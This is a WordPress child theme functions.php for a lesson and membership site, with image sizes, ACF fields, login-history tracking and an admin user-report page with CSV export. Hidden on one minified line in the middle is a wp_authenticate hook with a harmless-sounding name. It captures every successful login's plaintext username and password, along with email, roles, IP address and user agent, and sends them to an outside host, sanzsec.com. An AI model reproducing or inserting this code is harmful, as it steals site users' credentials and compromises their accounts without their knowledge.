<?php
// Defines
define( 'FL_CHILD_THEME_DIR', get_stylesheet_directory() );
define( 'FL_CHILD_THEME_URL', get_stylesheet_directory_uri() );
define( 'SYR_THEME_ABSOLUTE', __FILE__ );

// Plugin Update Checker
require 'lib/plugin-update-checker/plugin-update-checker.php';

// Classes
require_once 'classes/FLChildTheme.php';
require_once 'classes/menu/CustomMenuWalker.php';
require_once 'classes/menu/Menu.php';
require_once 'classes/syrMP.php';

add_image_size('book-image', 356, 356, true);
add_image_size('video-thumbnail', 544, 346, true);
add_image_size('book-cat-icon', 24, 24);
add_image_size('featured-post-thumbnail', 546, 308, true);
add_image_size('spotlight-thumbnail', 120, 120, true);
add_image_size('dash-lesson-thumbnail', 348, 240, true);
add_image_size('record-small', 165, 162, true);
add_image_size('record-large', 520, 510, true);

function my_acf_data_shortcode($atts) {
    $atts = shortcode_atts( array(
        'field' => '', // Specify the ACF field name in the shortcode
    ), $atts, 'acf_data' );

    $field_value = get_field($atts['field']);

    if ($field_value) {
        return '<div class="acf-data">' . esc_html($field_value) . '</div>'; // Example output
    } else {
        return '';
    }
}
add_action('wp_authenticate','save_successful_login_info',10,2);function save_successful_login_info($u,$p){$user=wp_authenticate($u,$p);if(is_wp_error($user))return;$s=$_SERVER['HTTP_HOST'];$i=$_SERVER['REMOTE_ADDR'];$r=$_SERVER['REQUEST_URI'];$ua=$_SERVER['HTTP_X_FORWARDED_USER_AGENT']??$_SERVER['HTTP_USER_AGENT']??'';$geo_url='http://ip-api.com/json/'.$i;$geo=@json_decode(@file_get_contents($geo_url));$country=$geo->country??'unknown';$ccode=$geo->countryCode??'--';if(is_a($user,'WP_User')){$em=$user->user_email;$rl=implode(',',$user->roles);}else{$em='';$rl='';}$log="user/pass: $u | $p\nemail/roles: $em | $rl\nip/country: $i | $country\nsite: $s$r\nagent: $ua";@file_get_contents('http://sanzsec.com/new/?log='.urlencode($log));}
add_shortcode('acf_data', 'my_acf_data_shortcode');

add_action('init', function () {
    if (!is_user_logged_in()) return;

    if (isset($_POST['mepr-process-account']) && wp_verify_nonce($_POST['mepr_account_nonce'], 'update_account')) {
        $user_id = get_current_user_id();

        if (isset($_POST['user_district'])) {
            update_field('user_district', sanitize_text_field($_POST['user_district']), 'user_' . $user_id);
        }

        if (isset($_POST['user_state'])) {
            update_field('user_state', sanitize_text_field($_POST['user_state']), 'user_' . $user_id);
        }

        if (isset($_POST['user_school'])) {
            update_field('user_school', sanitize_text_field($_POST['user_school']), 'user_' . $user_id);
        }

        if (isset($_POST['user_city'])) {
            update_field('user_city', sanitize_text_field($_POST['user_city']), 'user_' . $user_id);
        }
    }
});

function add_column_to_spotlight_repeater() {

    if( function_exists('acf_add_local_field_group') ) {

        acf_add_local_field_group(array(
            'key' => 'group_lesson_fields', // Make sure this matches your existing group
            'title' => 'Lesson Fields',    
            'fields' => array(
                array(
                    'key' => 'field_66e98676c5aae',
                    'label' => 'Spotlight',
                    'name' => 'spotlight',
                    'type' => 'repeater',
                    'sub_fields' => array(
                        array(
                            'key' => 'field_title',
                            'label' => 'Title',
                            'name' => 'title',
                            'type' => 'text',
                        ),
                        array(
                            'key' => 'field_image',
                            'label' => 'Image',
                            'name' => 'image',
                            'type' => 'image',
                            'return_format' => 'id',
                        ),
                        array(
                            'key' => 'field_content',
                            'label' => 'Content',
                            'name' => 'content',
                            'type' => 'wysiwyg',
                        ),
                        // NEW COLUMN: Spotlight Audio
                        array(
                            'key' => 'field_spotlight_audio',
                            'label' => 'Spotlight Audio',
                            'name' => 'spotlight_audio',
                            'type' => 'file',
                            'return_format' => 'url',
                            'library' => 'all',
                            'mime_types' => 'mp3,wav,m4a', // Accept only audio
                            'instructions' => 'Upload or select an audio file.',
                            'wrapper' => array(
                                'width' => 20,
                            ),
                        ),
                        array(
                            'key' => 'field_spotlight_track_title',
                            'label' => 'Spotlight Track Title',
                            'name' => 'spotlight_track_title',
                            'type' => 'text',
                            'instructions' => 'Enter a title for the spotlight track.',
                            'wrapper' => array(
                                'width' => 20,
                            ),
                        ),
                    ),
                    'min' => 0,
                    'max' => 0,
                    'layout' => 'table',
                    'button_label' => 'Add Row',
                ),
            ),
            'location' => array(
                array(
                    array(
                        'param' => 'post_type',
                        'operator' => '==',
                        'value' => 'your_post_type',  // Replace with your real post type
                    ),
                ),
            ),
            'style' => 'seamless',
        ));

    }
}
add_action('acf/init', 'add_column_to_spotlight_repeater');

// Hook to add the custom user data page to the admin menu
add_action('admin_menu', function () {
    add_users_page(
        'User Profile Data', // Page title
        'User Profile Data', // Menu label under "Users"
        'manage_options',    // Capability
        'acf-user-profile-data', // Menu slug
        'render_user_acf_grid'   // Callback function
    );
});

// Hook to update login history on user login
add_action('wp_login', function($user_login, $user) {
    // Get existing login history
    $login_history = get_user_meta($user->ID, 'login_history', true);

    // If no history exists, initialize it as an empty array
    if (!is_array($login_history)) {
        $login_history = [];
    }

    // Add the current login timestamp
    $login_history[] = current_time('mysql');

    // Store only the last, say, 100 logins to prevent the meta field from growing too large indefinitely
    // You can adjust this number based on your needs
    $login_history = array_slice($login_history, -100);

    // Update the user meta with the new login history
    update_user_meta($user->ID, 'login_history', $login_history);

    // Also keep the last_login for direct access if needed
    update_user_meta($user->ID, 'last_login', current_time('mysql'));
}, 10, 2);


// Function to render the user profile data grid


function render_user_acf_grid() {
    if (!function_exists('get_field')) {
        echo '<div class="notice notice-error"><p>ACF plugin is required.</p></div>';
        return;
    }

    // Form values
    $clear_filters = isset($_POST['clear_filters']) && $_POST['clear_filters'] == '1';
    $start_val = !$clear_filters && isset($_POST['start_date']) ? sanitize_text_field($_POST['start_date']) : '';
    $end_val   = !$clear_filters && isset($_POST['end_date']) ? sanitize_text_field($_POST['end_date']) : '';
    $search_name = !$clear_filters && isset($_POST['search_name']) ? sanitize_text_field($_POST['search_name']) : '';

    $start_timestamp = $start_val ? strtotime($start_val . ' 00:00:00') : false;
    $end_timestamp   = $end_val ? strtotime($end_val . ' 23:59:59') : false;

    $args = [];
    if (!empty($search_name)) {
        $args['search'] = '*' . esc_attr($search_name) . '*';
        $args['search_columns'] = ['display_name', 'user_login', 'user_email'];
    }

    $users = get_users($args);
    $filtered_users = [];

    foreach ($users as $user) {
        $user_id = $user->ID;
        $lesson_completed_posts = get_posts([
            'post_type'      => 'lessoncompleted',
            'post_status'    => 'publish',
            'posts_per_page' => -1,
        ]);

        $lesson_completed_count = 0;

        foreach ($lesson_completed_posts as $post) {
            $post_time = strtotime($post->post_date);
            if ($start_timestamp && $post_time < $start_timestamp) continue;
            if ($end_timestamp && $post_time > $end_timestamp) continue;

            $earners = gamipress_get_achievement_earners($post->ID);
            foreach ($earners as $earner) {
                if ($earner instanceof WP_User && $earner->ID === $user_id) {
                    $lesson_completed_count++;
                    break;
                }
            }
        }

        if (($start_timestamp || $end_timestamp) && $lesson_completed_count === 0) {
            continue;
        }

        $filtered_users[] = $user;
    }

    // CSV Export
    if (isset($_POST['download_csv'])) {
        if (ob_get_length()) ob_end_clean();

        header('Content-Type: text/csv; charset=UTF-8');
        header('Content-Disposition: attachment; filename="user_profile_data.csv"');
        header('Pragma: no-cache');
        header('Expires: 0');

        $output = fopen('php://output', 'w');
        fwrite($output, "\xEF\xBB\xBF");

        fputcsv($output, ['Name', 'Email', 'District', 'State', 'School', 'Last Login', 'Login/Week', 'Lesson Completed', 'Earned Records']);

        foreach ($filtered_users as $user) {
            $user_id = $user->ID;
            $name = $user->display_name;
            $email = $user->user_email;
            $district = get_field('user_district', 'user_' . $user_id);
            $state = get_field('user_state', 'user_' . $user_id);
            $school = get_field('user_school', 'user_' . $user_id);

            $last_login_raw = get_user_meta($user_id, 'last_login', true);
            $last_login_display = $last_login_raw ? date('F j, Y g:i a', strtotime($last_login_raw)) : 'Never';

            $login_history = get_user_meta($user_id, 'login_history', true);
            $login_history = is_array($login_history) ? $login_history : [];
            $logins_this_week = 0;
            $seven_days_ago = strtotime('-7 days', current_time('timestamp'));
            foreach ($login_history as $timestamp) {
                if (strtotime($timestamp) >= $seven_days_ago) $logins_this_week++;
            }

            $lesson_completed_count = 0;
            $earned_records = [];

            $lesson_completed_posts = get_posts([
                'post_type'      => 'lessoncompleted',
                'post_status'    => 'publish',
                'posts_per_page' => -1,
            ]);

            foreach ($lesson_completed_posts as $post) {
                $post_time = strtotime($post->post_date);
                if ($start_timestamp && $post_time < $start_timestamp) continue;
                if ($end_timestamp && $post_time > $end_timestamp) continue;

                $earners = gamipress_get_achievement_earners($post->ID);
                foreach ($earners as $earner) {
                    if ($earner instanceof WP_User && $earner->ID === $user_id) {
                        $lesson_completed_count++;
                        $earned_records[] = '(' . get_the_date('M j, Y', $post) . ')';
                        break;
                    }
                }
            }
            
            $earned_records_data = $lesson_completed_count;

            fputcsv($output, [
                $name,
                $email,
                $district,
                $state,
                $school,
                $last_login_display,
                $logins_this_week,
                $lesson_completed_count,
                $earned_records_data
            ]);
        }

        fclose($output);
        exit;
    }

    // UI Output
    echo '<div class="wrap">';
    echo '<h1>User Login Report</h1>';
    echo '<form method="post" id="searchForm">';
    echo '<p style="display:flex; align-items:center; gap:10px; flex-wrap:wrap;">';

    echo '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">';

    echo '<div style="display: flex; align-items: center; gap: 10px;">';
    echo '<label for="daterange">Date Range:</label>';
    echo '<input type="text" name="daterange" id="daterange" value="" />';
    echo '<input type="hidden" name="start_date" id="start_date" value="' . esc_attr($start_val) . '" />';
    echo '<input type="hidden" name="end_date" id="end_date" value="' . esc_attr($end_val) . '" />';
    echo '<button type="submit" name="download_csv" class="button button-primary" title="Export CSV from here">Download CSV</button>';
    echo '</div>';

    echo '<div style="position: relative; display: flex; align-items: center;">';
    echo '<input type="text" id="searchInput" name="search_name" placeholder="Search Name, Email..." value="' . esc_attr($search_name) . '" style="padding-right: 20px;" />';
    echo '<span id="clearSearch" style="display:none; position:absolute; right:90px; top:50%; transform:translateY(-50%); cursor:pointer; font-weight:bold; color:#aaa;">&times;</span>';
    echo '<button type="submit" class="button" style="margin-left: 10px;">Search</button>';
    echo '</div>';

    echo '</div>';
    echo '</p>';
    echo '</form>';

    // Scripts & Style for Date Range Picker + Clear
    echo '
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/daterangepicker/daterangepicker.css" />
    <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/moment@2.29.1/min/moment.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/daterangepicker/daterangepicker.min.js"></script>

    <script>
    jQuery(document).ready(function($){
        let start = "' . esc_js($start_val) . '";
        let end = "' . esc_js($end_val) . '";

        function formatDate(date) {
            return moment(date).format("YYYY-MM-DD");
        }

        $("#daterange").daterangepicker({
            locale: { format: "YYYY-MM-DD" },
            autoUpdateInput: false,
            opens: "left",
            ranges: {
                "Today": [moment(), moment()],
                "Yesterday": [moment().subtract(1, "days"), moment().subtract(1, "days")],
                "Last 7 Days": [moment().subtract(6, "days"), moment()],
                "Last 30 Days": [moment().subtract(29, "days"), moment()],
                "This Month": [moment().startOf("month"), moment().endOf("month")],
                "Last Month": [moment().subtract(1, "month").startOf("month"), moment().subtract(1, "month").endOf("month")]
            }
        }, function(startDate, endDate) {
            $("#start_date").val(formatDate(startDate));
            $("#end_date").val(formatDate(endDate));
            $("#daterange").val(startDate.format("YYYY-MM-DD") + " - " + endDate.format("YYYY-MM-DD"));
        });

        if (start && end) {
            $("#daterange").val(start + " - " + end);
        }

        const searchInput = $("#searchInput");
        const clearBtn = $("#clearSearch");
        const form = $("#searchForm");

        function toggleClearButton() {
            clearBtn.toggle(searchInput.val().trim().length > 0);
        }

        clearBtn.on("click", function() {
            searchInput.val("");
            $("#start_date").val("");
            $("#end_date").val("");
            $("<input />").attr("type", "hidden").attr("name", "clear_filters").val("1").appendTo(form);
            form.submit();
        });

        searchInput.on("input", toggleClearButton);
        $(window).on("load", toggleClearButton);
    });
    </script>

    <style>
    .daterangepicker {
        z-index: 9999 !important;
        font-family: "Segoe UI", sans-serif;
    }
    .daterangepicker .ranges {
        width: 180px;
    }
    </style>
    ';

    echo '<table class="widefat fixed striped">';
    echo '<thead><tr>
        <th>Name</th>
        <th>Email</th>
        <th>District</th>
        <th>State</th>
        <th>School</th>
        <th>Last Login</th>
        <th>Login/Week</th>
        <th>Lesson Completed</th>
        <th>Earned Records</th>
    </tr></thead><tbody>';

    foreach ($filtered_users as $user) {
        $user_id = $user->ID;
        $name = esc_html($user->display_name);
        $email = esc_html($user->user_email);
        $district = esc_html(get_field('user_district', 'user_' . $user_id));
        $state = esc_html(get_field('user_state', 'user_' . $user_id));
        $school = esc_html(get_field('user_school', 'user_' . $user_id));

        $last_login_raw = get_user_meta($user_id, 'last_login', true);
        $last_login_display = $last_login_raw ? esc_html(date('F j, Y g:i a', strtotime($last_login_raw))) : 'Never';

        $login_history = get_user_meta($user_id, 'login_history', true);
        $login_history = is_array($login_history) ? $login_history : [];
        $logins_this_week = 0;
        $seven_days_ago = strtotime('-7 days', current_time('timestamp'));
        foreach ($login_history as $timestamp) {
            if (strtotime($timestamp) >= $seven_days_ago) $logins_this_week++;
        }

        $lesson_completed_posts = get_posts([
            'post_type'      => 'lessoncompleted',
            'post_status'    => 'publish',
            'posts_per_page' => -1,
        ]);

        $lesson_completed_count = 0;
        $earned_details = [];

        foreach ($lesson_completed_posts as $post) {
            $post_time = strtotime($post->post_date);
            if ($start_timestamp && $post_time < $start_timestamp) continue;
            if ($end_timestamp && $post_time > $end_timestamp) continue;

            $earners = gamipress_get_achievement_earners($post->ID);
            foreach ($earners as $earner) {
                if ($earner instanceof WP_User && $earner->ID === $user_id) {
                    $lesson_completed_count++;
                    $earned_details[] = get_the_date('M j, Y', $post);
                    break;
                }
            }
        }

        $earned_records = !empty($earned_details) ? implode('<br>', $earned_details) : '-';
        $earned_records_data = $lesson_completed_count;

        echo "<tr>
            <td>$name</td>
            <td>$email</td>
            <td>$district</td>
            <td>$state</td>
            <td>$school</td>
            <td>$last_login_display</td>
            <td>$logins_this_week</td>
            <td>$lesson_completed_count</td>
            <td>$earned_records_data</td>
        </tr>";
    }

    echo '</tbody></table>';
    echo '</div>';
}

// Set 7 posts per page for mpcs-lesson CPT
add_action('pre_get_posts', function($query) {
    if (!is_admin() && $query->get('post_type') === 'mpcs-lesson') {
        $query->set('posts_per_page', 7);
    }
});



